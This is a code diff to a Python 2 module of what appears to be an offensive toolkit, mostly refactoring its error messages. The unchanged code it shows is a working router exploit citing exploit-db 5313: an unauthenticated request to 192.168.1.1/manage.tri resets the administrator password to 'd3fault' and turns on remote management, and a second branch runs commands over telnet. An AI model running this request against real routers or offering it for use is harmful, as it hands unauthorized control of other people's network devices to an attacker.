@@ -1,4 +1,4 @@
-import util
+from util import Msg, Error, debug
 import urllib, telnetlib
 
 #
@@ -19,8 +19,7 @@ def vulnerabilities():
 def run ( run ):
 	if run == 1:
 		# http://www.exploit-db.com/exploits/5313/
-		tmp = vulnerabilities()[run-1]
-		print '[dbg] running ', tmp
+
 		print '[+] Resetting password at 192.168.1.1...'
 		url = '''http://192.168.1.1/manage.tri?remote_mg_https=0&http_enable=1&https_enable=0&PasswdModify=1
 			     &http_passwd=d3fault&http_passwdConfirm=d3fault&_http_enable=1&web_wl_filter=1
@@ -29,8 +28,7 @@ def run ( run ):
 		try:
 			response = urllib.urlopen(url)
 		except Exception, j:
-			print '[-] Could not connect to host.'
-			print '[dbg] error: ', j
+			Error('Could not connect to host.')
 			return
 		print response.read()
 		print '[+] Done.  Log in with administrative password \'d3fault\''
@@ -47,8 +45,7 @@ def run ( run ):
 			tn.write('exit\n')
 			print tn.read_all()
 		except Exception, j:
-			print '[-] Could not get host.'
-			print '[dbg] error: ', j
+			Error('Could not get host.')
 			return
 		print '[+] Done.'
 		return
